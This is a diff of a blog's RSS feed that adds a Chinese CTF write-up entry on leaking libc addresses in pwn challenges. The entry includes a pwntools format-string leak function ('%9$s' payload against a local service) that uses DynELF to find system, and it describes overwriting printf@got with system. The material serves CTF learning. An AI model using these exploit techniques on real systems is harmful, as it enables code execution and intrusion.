@@ -6,7 +6,18 @@
     <description>Recent content in learning on Iluvata&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Wed, 07 Apr 2021 16:03:50 +0800</lastBuildDate><atom:link href="https://iluvata.github.io/categories/learning/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 10 Nov 2021 12:35:39 +0800</lastBuildDate><atom:link href="https://iluvata.github.io/categories/learning/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>libc泄漏</title>
+      <link>https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/</link>
+      <pubDate>Wed, 10 Nov 2021 12:35:39 +0800</pubDate>
+      
+      <guid>https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/</guid>
+      <description>libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
+格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
+def leak(addr): p = remote(&amp;#39;127.0.0.1&amp;#39;, &amp;#39;10001&amp;#39;) p.recvline() payload = &amp;#34;%9$s.AAA&amp;#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&amp;#34;.AAA&amp;#34;)[:-4] + &amp;#34;\x00&amp;#34; log.info(&amp;#34;leaking: 0x%x--&amp;gt; %s&amp;#34; % (addr, data.encode(&amp;#39;hex&amp;#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&amp;#39;system&amp;#39;, &amp;#39;libc&amp;#39;) printf_addr = data.lookup(&amp;#39;printf&amp;#39;, &amp;#39;libc&amp;#39;) log.info(&amp;#34;system address: 0x%x&amp;#34; % system_addr) log.info(&amp;#34;printf address: 0x%x&amp;#34; % printf_addr)   DynELF 不要求我们拿到 libc.</description>
+    </item>
+    
     <item>
       <title>迭代与递归</title>
       <link>https://iluvata.github.io/post/2021-04-07_iteration-and-recurtion/</link>
